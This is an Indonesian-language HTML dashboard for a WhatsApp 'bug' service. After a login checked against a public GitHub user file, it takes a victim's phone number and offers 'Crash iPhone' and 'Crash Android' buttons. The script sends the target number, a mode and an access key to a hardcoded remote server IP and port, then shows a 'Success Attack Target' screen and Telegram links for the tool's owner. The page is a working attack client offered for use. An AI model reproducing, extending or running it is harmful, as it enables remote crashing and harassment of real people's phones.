<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>XZET Dashboard</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: Arial, sans-serif;
      background: url("https://j.top4top.io/p_3468nai4p1.jpg") no-repeat center center fixed;
      background-size: cover;
      color: white;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    .container {
      background: rgba(15, 15, 15, 0.85);
      padding: 30px 20px 60px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.5);
      text-align: center;
      width: 90%;
      max-width: 400px;
      position: relative;
    }
    .input {
      display:block; width:100%;
      margin:15px 0; padding:10px;
      background:#1e1e1e; border:1px solid #333;
      border-radius:6px; color:white; font-size:16px;
    }
    button {
      padding:10px 20px; margin:10px 5px;
      background:#2b3f5c; color:white; font-weight:bold;
      border:none; border-radius:6px;
      cursor:pointer; transition:0.2s;
    }
    button:hover { background:#3f3f3f; }
    .hidden { display:none; }
    .logout-btn {
      position:fixed; top:15px; right:15px;
    }
    .bottom-links {
      position:fixed; bottom:20px; left:50%;
      transform:translateX(-50%);
      display:flex; gap:10px;
    }
    .marquee-wrapper {
      margin-top:15px;
      font-size:14px; font-weight:bold; color:#ddd;
    }
  </style>
</head>
<body>

<!-- Login -->
<div class="container" id="loginPage">
  <h2>üîê Login ke XZET</h2>
  <input id="username" class="input" type="text" placeholder="Username" />
  <input id="password" class="input" type="password" placeholder="Password" />
  <button onclick="login()">Login</button>
  <p id="errorMsg" style="color:red;margin-top:10px;"></p>
</div>

<!-- Menu -->
<div class="container hidden" id="menuPage">
  <h2>üí• Menu Bug WhatsApp</h2>
  <input id="target" class="input" type="text" placeholder="Masukkan nomor target 62xxxx" />
  <button onclick="sendBug('ios')">Crash iPhone</button>
  <button onclick="sendBug('android')">Crash Android</button>
  <div class="marquee-wrapper">
    <marquee behavior="scroll" direction="left" scrollamount="4">
      Thanks To : BancetMyself - And My God - And My Family
    </marquee>
  </div>
</div>

<!-- Success -->
<div class="container hidden" id="successPage">
  <div id="successContent"></div>
  <button onclick="showPage('menuPage')">üîô Back to Menu</button>
</div>

<!-- Logout + Links -->
<div class="logout-btn hidden" id="logoutBtn">
  <button onclick="logout()">Logout</button>
</div>
<div class="bottom-links hidden" id="links">
  <a href="https://t.me/BancetMyself" target="_blank"><button>üëë Owner</button></a>
  <a href="https://t.me/SecretMInformation" target="_blank"><button>üì£ Channel</button></a>
</div>

<script>
  const USERS_URL = "https://raw.githubusercontent.com/ZauzetGithab/XzetVictus/main/users.json"; 
  // Ganti USERNAME & REPO dengan repo GitHub public lu

  async function login() {
    const u = document.getElementById("username").value.trim();
    const p = document.getElementById("password").value.trim();
    const err = document.getElementById("errorMsg");

    try {
      const res = await fetch(USERS_URL);
      if (!res.ok) throw new Error("Gagal ambil data");
      const users = await res.json();
      const match = users.find(user => user.username === u && user.password === p);

      if (match) {
        localStorage.setItem("loggedIn", "true");
        showPage("menuPage");
        document.getElementById("logoutBtn").classList.remove("hidden");
        document.getElementById("links").classList.remove("hidden");
      } else {
        err.textContent = "‚ùå Username atau password salah!";
      }
    } catch {
      err.textContent = "‚ùó Gagal mengambil data pengguna!";
    }
  }

  function logout() {
    localStorage.removeItem("loggedIn");
    location.reload();
  }

  function showPage(page) {
    ["loginPage","menuPage","successPage"].forEach(id => 
      document.getElementById(id).classList.add("hidden"));
    document.getElementById(page).classList.remove("hidden");
  }

  async function sendBug(type) {
    const target = document.getElementById("target").value.trim();
    if (!target.startsWith("62")) return alert("Nomor harus diawali 62");
    
    const today = new Date();
    const tgl = `${today.getDate()} ${today.toLocaleString('id-ID',{month:'long'})} ${today.getFullYear()}`;
    const mode = type === "ios" ? "ios" : "andros";
    const bugType = type === "ios" ? "Crash iPhone" : "Crash Android";

    try {
      await fetch(`http://170.64.161.133:1905/execution?target=${target}&mode=${mode}&username=Bancet&key=W4BT`);
      document.getElementById("successContent").innerHTML = `
        ‚úÖ <b>Success Attack Target</b><br>
        üì± <b>Target:</b> ${target}<br>
        üêû <b>Bug Type:</b> ${bugType}<br>
        üìÖ <b>Date:</b> ${tgl}
      `;
      showPage("successPage");
    } catch {
      alert("Gagal kirim bug!");
    }
  }

  window.onload = () => {
    if (localStorage.getItem("loggedIn") === "true") {
      showPage("menuPage");
      document.getElementById("logoutBtn").classList.remove("hidden");
      document.getElementById("links").classList.remove("hidden");
    }
  };
</script>

</body>
</html>
